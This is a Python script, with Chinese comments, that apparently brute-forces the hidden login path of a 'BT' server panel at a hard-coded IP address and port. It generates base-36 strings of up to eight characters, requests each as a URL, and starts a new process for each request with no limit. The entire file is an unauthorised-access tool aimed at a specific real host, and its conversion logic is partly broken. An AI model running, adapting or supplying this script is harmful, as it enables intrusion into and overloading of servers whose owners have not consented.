import sys
import os
import time
import requests
import multiprocessing

def convert(num):

	nums = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

	new_num = ""
	while num != 0:
		remainder = int(num % 36)
		new_num += nums[remainder]
		num -= remainder
		num /= 36

	return new_num[::-1]

def tryBT(urlPrefix, enrty):
	url = 'http://' + urlPrefix + '/' + enrty

	try:
	    r = requests.get(url, timeout=1)
	    r.raise_for_status()
	    print(r.status_code)

	except requests.RequestException as e:
	    print('Error '+ str(e))

	    return 0
	else:

	    return 1

def do(n):				# 参数n由args=(1,)传入
	name = multiprocessing.current_process().name		# 获取当前进程的名字
	print(name, 'starting')
	print("worker ", n)
	return


if __name__ == "__main__":


# ip:port
	urlPrefix = '65.0.187.255:8888'

	i = 1

	while (i < 36*36*36*36*36*36*36*36) :
		convertStr = str(convert(i)).lower()
		result = tryBT(urlPrefix, convertStr)

		p = multiprocessing.Process(target=tryBT, args=(urlPrefix,convertStr,))	# (i,)中加入","表示元祖
		# numList.append(p)
		p.start()

		# while result != 0:
		# 	url = 'http://' + urlPrefix + '/' + convertStr
		# 	print('BT Entry Found: ' + url)
		# 	exit()

		i+=1



